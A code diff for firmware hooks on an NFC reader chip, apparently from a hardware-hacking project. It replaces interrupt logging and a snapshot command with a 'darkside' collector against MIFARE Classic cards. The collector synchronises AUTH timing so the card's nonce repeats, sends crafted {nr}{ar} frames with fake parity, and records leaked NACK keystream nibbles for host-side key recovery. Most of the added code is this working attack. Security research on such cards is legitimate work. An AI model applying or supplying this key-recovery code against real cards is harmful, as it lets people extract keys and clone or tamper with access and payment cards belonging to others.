@@ -38,6 +38,8 @@
 // 0x5C620) into a ring the host reads with READ8, and returns 0, so the ROM's state machine
 // never sees our raw exchanges and doesn't time out and re-poll. Interrupt context: RAM only.
 typedef unsigned int u32;
+typedef int s32;
+typedef short s16;
 typedef unsigned char u8;
 
 #define CMD_HOOK  (*(volatile u32 *)0x38718)
@@ -61,7 +63,7 @@ typedef unsigned char u8;
 #define irq_save    ROM_FN(0xC5C, u32 (*)(void))
 #define irq_restore ROM_FN(0xC64, void (*)(u32))
 
-enum { OP_READ8, OP_WRITE8, OP_CALL, OP_READ32, OP_WRITE32, OP_CAPTURE, OP_TXRAW, OP_AUTH, OP_TXSCHED, OP_NESTED, OP_SNAP, OP_CHKKEYS };
+enum { OP_READ8, OP_WRITE8, OP_CALL, OP_READ32, OP_WRITE32, OP_CAPTURE, OP_TXRAW, OP_AUTH, OP_TXSCHED, OP_NESTED, OP_SNAP, OP_CHKKEYS, OP_DARKSIDE };
 
 // Captured frames: regs = TX/RX status (0x5C5D0), 0x5C588, 0x5C58C, 0x5C598, 0x5C5A0 (RX bytes).
 #define N_FRAMES   8
@@ -87,22 +89,11 @@ static struct {
 	u32 ent[N_LOG][2];
 } irqlog;
 
-static void log_irq(u32 group, u32 status)
+// The RF and timer interrupt groups: pass the status through unchanged (identity filter), the same
+// as the ROM would. (The per-interrupt trace that once lived here was removed to make room; irqlog
+// stays zero, so the OP_CAPTURE ABI and chipmon.irqs() are unchanged.)
+static u32 pass_filter(u32 status)
 {
-	u32 *e = irqlog.ent[irqlog.count++ % N_LOG];
-	e[0] = TIMER << 8 | group;
-	e[1] = status;
-}
-
-static u32 rf_filter(u32 status)
-{
-	if (capturing) log_irq(0, status);
-	return status;
-}
-
-static u32 tmr_filter(u32 status)
-{
-	if (capturing) log_irq(2, status);
 	return status;
 }
 
@@ -139,7 +130,6 @@ static void reply(u32 status, const u8 *data, u32 len)
 static u32 txrx_filter(u32 status)
 {
 	if (!capturing) return status;
-	log_irq(1, status);
 	if (!(status & TXRX_RX_DONE)) return 0;
 	struct frame *f = &capture.ring[capture.count % N_FRAMES];
 	static const u32 regs[5] = { 0, 0x5C588, 0x5C58C, 0x5C598, 0x5C5A0 };
@@ -168,7 +158,6 @@ static u32 txstart(u32 r570, u32 r574, u32 code, u32 r55c, const u8 *data, u32 l
 	REG(0x5C574) = r574;
 	REG(0x5C568) = code;
 	REG(0x5C55C) = r55c;
-	if (capturing) log_irq(3, code); // TX start, for timing against the TX/RX interrupts
 	for (u32 i = 0; i < len; i++) TX_PORT = data[i];
 	return irq;
 }
@@ -258,6 +247,19 @@ static void putbit(u8 *p, u32 i, u32 v)
 	p[i >> 3] |= v << (i & 7);
 }
 
+// Decode the plaintext tag nonce from the last captured frame (the RX stream continues at bit 4,
+// after the 36-bit AUTH frame). 0 if the frame is too short.
+static int recv_nt(u32 *nt_out)
+{
+	struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
+	if (f->len < 5) return 0;
+	u32 nt = 0;
+	for (u32 j = 0; j < 4; j++)
+		for (u32 k = 0; k < 8; k++) nt |= getbit(f->data, 4 + 9 * j + k) << (24 - 8 * j + k);
+	*nt_out = nt;
+	return 1;
+}
+
 // Reader side of the 3-pass auth (first auth, plaintext nt). Returns 0 if no nt came back.
 static int auth(const u8 *key, u32 uid, u32 nr, u32 code, const u8 *frame, u32 len, u32 nrar_tx, u32 *nt_out)
 {
@@ -265,13 +267,8 @@ static int auth(const u8 *key, u32 uid, u32 nr, u32 code, const u8 *frame, u32 l
 	txraw(0, 1, code, 0x88, frame, len);
 	for (u32 t0 = TIMER; *(volatile u32 *)&capture.count == seen;) // set by the RX interrupt
 		if (t0 - TIMER > 20000) return 0;
-	// nt, 4 bytes + parity; the RX bit stream continues where the 36-bit AUTH frame left off
-	struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
-	if (f->len < 5) return 0;
-	u32 nt = 0;
-	for (u32 j = 0; j < 4; j++)
-		for (u32 k = 0; k < 8; k++) nt |= getbit(f->data, 4 + 9 * j + k) << (24 - 8 * j + k);
-	*nt_out = nt;
+	if (!recv_nt(nt_out)) return 0;
+	u32 nt = *nt_out;
 	c1_odd = c1_even = 0;
 	for (int i = 47; i > 0; i -= 2) { // key as a 48-bit big-endian number
 		u32 o = (i - 1) ^ 7, e = i ^ 7;
@@ -312,6 +309,20 @@ static int wait_rx(u32 seen, u32 ticks)
 	return 1;
 }
 
+// Run the re-select frames (HLTA / WUPA / SELECT, parity on); 1 if the card selected, 0 if a step
+// that expects an answer got none. steps: nsteps * (r574, code, rx(0/1), len, bytes).
+static int send_steps(const u8 *steps, u32 ns)
+{
+	const u8 *s = steps;
+	for (u32 st = 0; st < ns; st++, s += 4 + s[3]) {
+		u32 seen = capture.count;
+		txraw(0, s[0], s[1], 0x88, s + 4, s[3]);
+		if (!s[2]) delay(800); // HLTA: no answer, let it go out
+		else if (!wait_rx(seen, 5000)) return 0;
+	}
+	return 1;
+}
+
 // arg: uid(4 BE) nr(4 BE) at_wait(u16 LE, timer ticks) nsteps(u8), per step: r574 code rx(0/1) len
 // bytes (parity on); then auth code, auth len, auth frame (parity off), nkeys, keys[6]. Returns the
 // index of the key whose {at} checked out (0xFF = none), keys tried, keys the card didn't select for.
@@ -333,15 +344,7 @@ static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
 	if (keys + 6 * nk > end) return 0;
 	for (i = 0; i < nk && hit == 0xFF; i++) {
 		REG(PARITY_REG) = 0;
-		const u8 *s = steps;
-		u32 st;
-		for (st = 0; st < ns; st++, s += 4 + s[3]) {
-			u32 seen = capture.count;
-			txraw(0, s[0], s[1], 0x88, s + 4, s[3]);
-			if (!s[2]) delay(800); // HLTA: no answer, let it go out
-			else if (!wait_rx(seen, 5000)) break;
-		}
-		if (st < ns) {
+		if (!send_steps(steps, ns)) {
 			nosel++;
 			continue;
 		}
@@ -371,33 +374,108 @@ static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
 	return 3;
 }
 
-// Framer snapshot (OP_SNAP): on the next frame-log NTF (6F 09, FRAME_LOG on) of the armed RF mode,
-// 0x5C540-0x5C5BC, 0x5C640-0x5C6CC and 0x5C780-0x5C7BC go into the capture ring (free while not
-// capturing), as words. Shows how the ROM set the framer up for a technology (NOTES.md, NFC-V).
-// With a range given (base u32, words u8 <= 128), that range instead.
-static u32 snap_mode, snap_count, snap_base, snap_words;
+// A clock that counts up (TIMER is a free-running down-counter), so each AUTH can be fired at an
+// absolute time the way pm3 schedules on GetCountSspClk.
+#define NOW() ((u32)(0u - TIMER))
 
-static void snap_range(u32 *dst, u32 a, u32 n)
-{
-	for (u32 i = 0; i < n; i++) dst[i] = REG(a + 4 * i);
-}
+// OP_DARKSIDE: one darkside run (NOTES.md, issue #2). The card leaks a 4-bit encrypted NACK to a
+// wrong {nr}{ar} regardless of parity (always-leak). The card's PRNG free-runs, so the tag nonce is
+// a function of when the AUTH arrives: we fire each AUTH on an absolute grid `sync` ticks apart, so
+// with sync == one PRNG period the nonce repeats. The host first calls with a short `sync` and reads
+// back two nonces (nt0, nt1) to compute the period (dist_nt in Python), then calls with sync = period
+// to collect: lock onto the first nonce and, while it recurs, send a fixed {nr}{ar} for each missing
+// nt_diff (top 3 bits of nr byte 3) and record its NACK keystream. Several runs are intersected
+// (crapto1_darkside). {nr}{ar} uses auth()'s nrar framing.
+//
+// Per-nonce collection slots: the nonce hovers over a few values, so each gets its own 8 nt_diff
+// keystreams; the first to fill all 8 is the run's result.
+#define DS_NCAND 8
+static struct { u32 nt; u8 used, mask, ks[8]; } dscand[DS_NCAND];
 
-static int send_hook(u8 *pkt)
+// arg: sync(u32 LE) sfracq(s16 LE, per-fire sub-tick grid correction * 256) maxiter(u16 LE) atw(u16
+// LE, NACK wait ticks) nsteps(u8), per step r574 code rx(0/1) len bytes (parity on); acode(u8)
+// alen(u8) aframe[alen] (AUTH, parity off); 8 * nrar[9] (parity off, nt_diff 0..7). Returns nt0(u32)
+// nt1(u32) ks[8] (low nibble each, 0 unfilled) mask(u8). The grid spacing averages sync + sfracq/256
+// ticks, so the systematic per-fire nonce drift cancels and the nonce hovers over a few values.
+static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, u8 *out)
 {
-	if (snap_mode && pkt[0] == 0x6F && pkt[1] == 0x09 && pkt[3 + 5] == snap_mode) {
-		u32 *d = (u32 *)capture.ring;
-		if (snap_words) {
-			snap_range(d, snap_base, snap_words);
-		} else {
-			snap_range(d, 0x5C540, 32);
-			snap_range(d + 32, 0x5C640, 36);
-			snap_range(d + 68, 0x5C780, 16);
+	const u8 *end = arg + n;
+	if (n < 11) return 0;
+	u32 sync = get32(arg);
+	int sfracq = (s16)(arg[4] | arg[5] << 8);
+	u32 maxiter = arg[6] | arg[7] << 8, atw = arg[8] | arg[9] << 8, ns = arg[10];
+	const u8 *steps = arg + 11, *q = steps;
+	for (u32 i = 0; i < ns; i++) q += 4 + q[3];
+	u32 acode = q[0], alen = q[1];
+	const u8 *aframe = q + 2;
+	q += 2 + alen;
+	const u8 *nrar = q;
+	if (nrar + 9 * 8 > end) return 0; // host builds a well-formed arg; just guard the frame reads
+
+	// Tick quantization (~0.6 steps/tick) plus TX jitter means an exact 32-bit nonce rarely repeats,
+	// but with sync tuned the nonce hovers over only a few values. Keep a small table and fill each
+	// candidate nonce's 8 nt_diff slots independently; the first to complete wins. Catch-up keeps the
+	// hovering set small so the table doesn't thrash.
+	for (int i = 0; i < DS_NCAND; i++) dscand[i].used = 0;
+	u32 nsamp = 0, done = 0, iters = 0;
+	u32 fire = NOW() + sync;
+	s32 facc = 0;
+	out[12] = 0; // mask; nt0/ks are filled on completion, nt0 also sampled below for the host
+	for (; iters < maxiter && !done; iters++) {
+		REG(PARITY_REG) = 0;
+		if (!send_steps(steps, ns)) continue;
+		// Fire the AUTH on the absolute grid, so the nonce depends on timing only, not on how long the
+		// re-select took. The grid averages sync + sfracq/256 ticks (fractional accumulator) so the
+		// systematic drift cancels. Skip to the next grid point if the re-select already overran this.
+		fire += sync;
+		facc += sfracq;
+		s32 cr = facc >> 8;
+		fire += cr;
+		facc -= cr << 8;
+		while ((s32)(fire - (NOW() + 32)) < 0) fire += sync;
+		while ((s32)(NOW() - fire) < 0)
+			;
+		REG(PARITY_REG) = PARITY_OFF;
+		u32 seen = capture.count, nt;
+		txraw(0, 1, acode, 0x88, aframe, alen);
+		if (!wait_rx(seen, 20000) || !recv_nt(&nt)) continue;
+		if (nsamp == 0) { put32(out, nt); nsamp = 1; }      // nt0 (sample for the host)
+		else if (nsamp == 1) { put32(out + 13, nt); nsamp = 2; }  // nt1 (period calibration)
+		// find this nonce's candidate slot, or allocate the first free one
+		int ci = -1, fr = -1;
+		for (int i = 0; i < DS_NCAND; i++) {
+			if (!dscand[i].used) { if (fr < 0) fr = i; }
+			else if (dscand[i].nt == nt) { ci = i; break; }
 		}
-		snap_mode = 0;
-		snap_count++;
+		if (ci < 0 && fr >= 0) { ci = fr; dscand[ci].used = 1, dscand[ci].nt = nt, dscand[ci].mask = 0; }
+		if (ci < 0) continue; // table full of other nonces; skip this one
+		u32 c = 0;
+		while (c < 8 && (dscand[ci].mask & 1 << c)) c++;
+		if (c == 8) continue;
+		// send a fixed {nr}{ar} for nt_diff c (fake parity), record the 4-bit NACK keystream
+		seen = capture.count;
+		txraw(0, nrar_tx >> 8 & 0xFF, nrar_tx & 0xFF, 0x88, nrar + 9 * c, 9);
+		if (wait_rx(seen, atw)) {
+			struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
+			if (f->len >= 1) {
+				dscand[ci].ks[c] = (f->data[0] & 0xF) ^ 0x5; // NACK ^ 0x05 = keystream nibble
+				dscand[ci].mask |= 1 << c;
+				if (dscand[ci].mask == 0xFF) {
+					put32(out, dscand[ci].nt);
+					for (int k = 0; k < 8; k++) out[4 + k] = dscand[ci].ks[k];
+					out[12] = 0xFF;
+					done = 1;
+				}
+			}
+		}
 	}
-	return 0;
+	REG(PARITY_REG) = 0;
+	return 17;
 }
+
+// (OP_SNAP, the framer snapshot used once for NFC-V exploration, was removed to make room for the
+// darkside timed-sync collector. NOTES.md keeps the framer dumps it produced; re-add from git if
+// another technology needs one.)
 
 static int hook(u8 *msg)
 {
@@ -443,8 +521,8 @@ static int hook(u8 *msg)
 		if (n < 1) break;
 		capturing = arg[0];
 		TXRX_FILTER = (u32)txrx_filter;
-		RF_FILTER = (u32)rf_filter;
-		TMR_FILTER = (u32)tmr_filter;
+		RF_FILTER = (u32)pass_filter;
+		TMR_FILTER = (u32)pass_filter;
 		put32(buf, (u32)&capture);
 		put32(buf + 4, (u32)&irqlog);
 		reply(0, buf, 8);
@@ -501,15 +579,12 @@ static int hook(u8 *msg)
 		reply(0, buf, r);
 		return 1;
 	}
-	case OP_SNAP: // addr = RF mode to snapshot on (0 = off) -> ring address, snapshots taken so far
-		snap_mode = addr;
-		snap_words = n >= 5 && arg[4] <= 128 ? arg[4] : 0;
-		snap_base = n >= 5 ? get32(arg) & ~3 : 0;
-		SEND_HOOK = (u32)send_hook;
-		put32(buf, (u32)capture.ring);
-		put32(buf + 4, snap_count);
-		reply(0, buf, 8);
+	case OP_DARKSIDE: {
+		u32 r = darkside(arg, n, addr & 0xFFFF ? addr & 0xFFFF : 0x178, buf);
+		if (!r) break;
+		reply(0, buf, r);
 		return 1;
+	}
 	case OP_TXSCHED:
 		if (n < 5 || n < 5u + 10 * arg[4]) break;
 		put32(buf, txsched(arg, arg + 5, arg[4], arg + 5 + 10 * arg[4], n - 5 - 10 * arg[4]));
